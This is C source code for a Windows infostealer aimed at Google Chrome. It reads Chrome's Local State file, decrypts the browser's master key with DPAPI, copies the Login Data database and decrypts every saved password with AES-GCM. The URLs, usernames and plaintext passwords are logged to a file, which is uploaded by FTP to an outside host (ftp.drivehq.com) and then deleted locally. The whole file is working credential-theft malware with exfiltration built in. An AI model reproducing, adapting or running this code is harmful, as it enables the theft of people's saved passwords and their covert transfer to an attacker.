#include <windows.h>
#include <stdio.h>
#include <bcrypt.h>
#include <WinInet.h>
#include "sqlite3.h"

#pragma comment (lib, "crypt32.lib")
#pragma comment ( lib , "bcrypt.lib")
#pragma comment (lib, "Wininet.lib")

#define TEMPDBPATH ".\\chromedb_tmp"
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define WCHAR_MAXPATH (MAX_PATH * sizeof(WCHAR))
typedef enum { Chrome = 0, Other = 1 } BrowserTargets;

DATA_BLOB Output;
HANDLE hLog = NULL;

BOOL VerifyBrowser(VOID);
BOOL  GetChromeData(VOID);
PCHAR GetMasterKey(PCHAR lpLocalState);
PCHAR StringRemoveSubstring(PCHAR String, CONST PCHAR Substring);
PCHAR StringTerminateString(PCHAR String, INT Character);
INT CallbackSqlite3QueryObjectRoutine(PVOID OpenDatabase, INT Argc, PCHAR* Argv, PCHAR* ColumnName);
VOID CharArrayToByteArray(PCHAR Char, PBYTE Byte, DWORD Length);

int main(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	HINTERNET hInternetOpen = NULL;
	HINTERNET hInternetConnect = NULL;
	WCHAR lpRemoteFile[WCHAR_MAXPATH] = L"\\file.txt";

	if (!VerifyBrowser())
		goto FAILURE;

	if (!GetChromeData())
		goto FAILURE;

	hInternetOpen = InternetOpenW(L"Mozilla/4.1337", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternetOpen == NULL)
		goto FAILURE;

	hInternetConnect = InternetConnectW(hInternetOpen, L"ftp.drivehq.com", INTERNET_DEFAULT_FTP_PORT, NULL , NULL, INTERNET_SERVICE_FTP, 0, 0);
	if (hInternetConnect == NULL)
		goto FAILURE;

	if (!FtpPutFileW(hInternetConnect, L"file.txt", lpRemoteFile, FTP_TRANSFER_TYPE_BINARY, 0))
		goto FAILURE;

	if (!DeleteFile(L"file.txt"))
		goto FAILURE;

	if (hInternetOpen)
		InternetCloseHandle(hInternetOpen);

	if (hInternetConnect)
		InternetCloseHandle(hInternetConnect);

	if (Output.pbData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Output.pbData);

	return ERROR_SUCCESS;

FAILURE:

	dwError = GetLastError();

	if (Output.pbData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Output.pbData);

	if (hInternetOpen)
		InternetCloseHandle(hInternetOpen);

	if (hInternetConnect)
		InternetCloseHandle(hInternetConnect);

	return dwError;
}

BOOL VerifyBrowser(VOID)
{
	HKEY hKey = HKEY_CURRENT_USER;
	WCHAR lpSubKey[WCHAR_MAXPATH] = L"Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice";
	HKEY  phkResult;
	WCHAR lpValueName[WCHAR_MAXPATH] = L"\\ProgId";
	WCHAR lpData[WCHAR_MAXPATH];
	DWORD bufferSize = sizeof(lpData);

	if (RegOpenKeyEx(hKey, lpSubKey, 0, KEY_ALL_ACCESS, &phkResult) != ERROR_SUCCESS)
		goto FAILURE;

	if (RegQueryValueEx(phkResult, L"ProgId", NULL, NULL, (LPBYTE)&lpData, &bufferSize) != ERROR_SUCCESS)
		goto FAILURE;

	if (hKey)
		RegCloseKey(hKey);

	if (phkResult)
		RegCloseKey(phkResult);

	if (wcscmp(lpData, L"ChromeHTML") != 0)
		return FALSE;

	return TRUE;

FAILURE:

	if (hKey)
		RegCloseKey(hKey);

	if (phkResult)
		RegCloseKey(phkResult);

	return FALSE;
}


BOOL GetChromeData(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	WCHAR wModulePath[WCHAR_MAXPATH] = { 0 };
	WCHAR chromeLocalState[WCHAR_MAXPATH] = L"\\Google\\Chrome\\User Data\\Local State";
	HANDLE hHandle = INVALID_HANDLE_VALUE;
	PCHAR lpLocalState = NULL;
	PCHAR Substring = NULL;
	DWORD dwBytesRead = 0;
	sqlite3* LoginDatabase = NULL;
	INT Result = ERROR_SUCCESS;
	PCHAR Error = NULL;
	WCHAR OrignalDBLocation[WCHAR_MAXPATH] = { 0 };
	WCHAR chromeCredPath[WCHAR_MAXPATH] = L"\\Google\\Chrome\\User Data\\Default\\Login Data";

	if (GetEnvironmentVariableW(L"LOCALAPPDATA", wModulePath, WCHAR_MAXPATH) == 0)
		goto FAILURE;

	wcscat_s(wModulePath, chromeLocalState);

	hHandle = CreateFile(wModulePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto FAILURE;

	dwError = GetFileSize(hHandle, NULL);
	if (dwError == INVALID_FILE_SIZE)
		goto FAILURE;

	lpLocalState = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dwError));
	if (lpLocalState == NULL)
		goto FAILURE;

	if (!ReadFile(hHandle, lpLocalState, dwError, &dwBytesRead, NULL))
		goto FAILURE;

	if (hHandle)
		CloseHandle(hHandle);

	if (GetMasterKey(lpLocalState) == NULL)
		goto FAILURE;

	if (lpLocalState)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpLocalState);

	//GetSQLData

	if (GetEnvironmentVariableW(L"LOCALAPPDATA", OrignalDBLocation, WCHAR_MAXPATH) == 0)
		goto FAILURE;

	wcscat_s(OrignalDBLocation, chromeCredPath);

	if (!CopyFile(OrignalDBLocation, TEXT(TEMPDBPATH), FALSE))
		goto FAILURE;

	Result = sqlite3_open_v2(TEMPDBPATH, &LoginDatabase, SQLITE_OPEN_READONLY, NULL);
	if (Result != ERROR_SUCCESS)
		goto FAILURE;

	hLog = CreateFileW(L"file.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hLog == INVALID_HANDLE_VALUE)
		goto FAILURE;

	Result = sqlite3_exec(LoginDatabase, "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS", CallbackSqlite3QueryObjectRoutine, LoginDatabase, &Error);
	if (Result != ERROR_SUCCESS)
		goto FAILURE;

	if (LoginDatabase)
		sqlite3_close(LoginDatabase);

	if (hLog)
		CloseHandle(hLog);

	return TRUE;

FAILURE:

	dwError = GetLastError();

#pragma warning (push)
#pragma warning( disable : 6001)
	if (hLog)
		CloseHandle(hLog);

	Substring = NULL;

	if (lpLocalState)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpLocalState);
#pragma warning(pop)

	return FALSE;
}

//Master Key

PCHAR StringRemoveSubstring(PCHAR String, CONST PCHAR Substring)
{
	DWORD Length = (DWORD)strlen(Substring);
	PCHAR pPointer = String;

	if (Length == 0)
		return NULL;

	while ((pPointer = strstr(pPointer, Substring)) != NULL)
	{
		MoveMemory(pPointer, pPointer + Length, strlen(pPointer + Length) + 1);
	}

	return String;
}

PCHAR StringTerminateString(PCHAR String, INT Character)
{
	DWORD Length = (DWORD)strlen(String);
	for (DWORD Index = 0; Index < Length; Index++)
	{
		if (String[Index] == Character)
		{
			String[Index] = '\0';
			return String;
		}
	}

	return NULL;
}

PCHAR GetMasterKey(PCHAR lpLocalState)
{
	PCHAR Substring = lpLocalState;
	DWORD dwBufferLen = 0;
	DWORD cchString = (DWORD)strlen(Substring);
	BYTE* pbBinary = 0;
	DATA_BLOB Input = { 0 };

	Substring = strstr(Substring, "\"os_crypt\":{\"encrypted_key\":\"");
	if (Substring == NULL)
		return NULL;

	if (StringRemoveSubstring(Substring, (PCHAR)"\"os_crypt\":{\"encrypted_key\":\"") == NULL)
		return NULL;

	if (StringTerminateString(Substring, '"') == NULL)
		return NULL;

	if (!CryptStringToBinaryA(Substring, (DWORD)strlen(Substring), CRYPT_STRING_BASE64, NULL, &dwBufferLen, NULL, NULL))
		goto FAILURE;

	pbBinary = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dwBufferLen));
	if (pbBinary == NULL)
		goto FAILURE;

	if (!CryptStringToBinaryA(Substring, (DWORD)strlen(Substring), CRYPT_STRING_BASE64, pbBinary, &dwBufferLen, NULL, NULL))
		goto FAILURE;

	if (pbBinary[0] == 'D')
		MoveMemory(pbBinary, pbBinary + 5, dwBufferLen);

	Input.cbData = dwBufferLen;
	Input.pbData = pbBinary;

	if (!CryptUnprotectData(&Input, 0, NULL, NULL, NULL, 0, &Output))
		goto FAILURE;

	return Substring;

FAILURE:

	if (pbBinary)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pbBinary);

	return NULL;
}

//CHAR to BYTE

VOID CharArrayToByteArray(PCHAR Char, PBYTE Byte, DWORD Length)
{
	for (DWORD dwX = 0; dwX < Length; dwX++)
	{
		Byte[dwX] = (BYTE)Char[dwX];
	}
}

//SQL CallBack

INT CallbackSqlite3QueryObjectRoutine(PVOID OpenDatabase, INT Argc, PCHAR* Argv, PCHAR* ColumnName)
{
	CHAR Password[WCHAR_MAXPATH] = { 0 };
	BYTE* Buffer = NULL;
	DWORD LenPass = (DWORD)strlen(Argv[2]);
	BYTE* pointer = NULL;
	BCRYPT_ALG_HANDLE bCryptHandle = NULL;
	NTSTATUS Status = 0;
	BCRYPT_KEY_HANDLE phKey = NULL;
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Info;
	BCRYPT_INIT_AUTH_MODE_INFO(Info);
	ULONG DecryptPassLen = 0;
	BYTE* DecryptPass = NULL;
	ULONG DecryptSize = 0;

	CHAR WriteArray[512] = { 0 };
	DWORD nNumberOfBytesToWrite = 0;
	DWORD lpNumberOfBytesWritten = 0;

	if (LenPass < 32)
		return 0;

	CopyMemory(Password, Argv[2], LenPass);

	Buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LenPass);
	if (Buffer == NULL)
		goto FAILURE;

	CharArrayToByteArray(Password, Buffer, LenPass);
	pointer = Buffer;
	pointer += 3;

	Status = BCryptOpenAlgorithmProvider(&bCryptHandle, BCRYPT_AES_ALGORITHM, NULL, NULL);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	Status = BCryptSetProperty(bCryptHandle, L"ChainingMode", (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 0, NULL);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	Status = BCryptGenerateSymmetricKey(bCryptHandle, &phKey, NULL, 0, Output.pbData, Output.cbData, 0);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	Info.pbNonce = pointer;
	Info.cbNonce = 12;
	Info.pbTag = (Info.pbNonce + LenPass - (3 + 16));
	Info.cbTag = 16;

	DecryptPassLen = LenPass - 3 - Info.cbNonce - Info.cbTag;
	DecryptPass = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DecryptPassLen);
	if (DecryptPass == NULL)
		goto FAILURE;

	Status = BCryptDecrypt(phKey, (Info.pbNonce + Info.cbNonce), DecryptPassLen, &Info, NULL, 0, DecryptPass, DecryptPassLen, &DecryptSize, 0);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	sprintf(WriteArray, "Url: %s\r\nUsername: %s\r\nPassword: %s\r\n\n", Argv[0], Argv[1], (PCHAR)DecryptPass);
	nNumberOfBytesToWrite = (DWORD)strlen(WriteArray);

	if (!WriteFile(hLog, WriteArray, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL))
		goto FAILURE;

	if (Buffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Buffer);

	if (bCryptHandle)
		BCryptCloseAlgorithmProvider(bCryptHandle, 0);

	if (phKey)
		BCryptDestroyKey(phKey);

	if (DecryptPass)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, DecryptPass);

	return ERROR_SUCCESS;

FAILURE:

	if (Buffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Buffer);

	if (DecryptPass)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, DecryptPass);

#pragma warning (push)
#pragma warning( disable : 4700)
	if (bCryptHandle)
		BCryptCloseAlgorithmProvider(bCryptHandle, 0);

	if (phKey)
		BCryptDestroyKey(phKey);
#pragma warning(pop)

	return ERROR_SUCCESS;
}
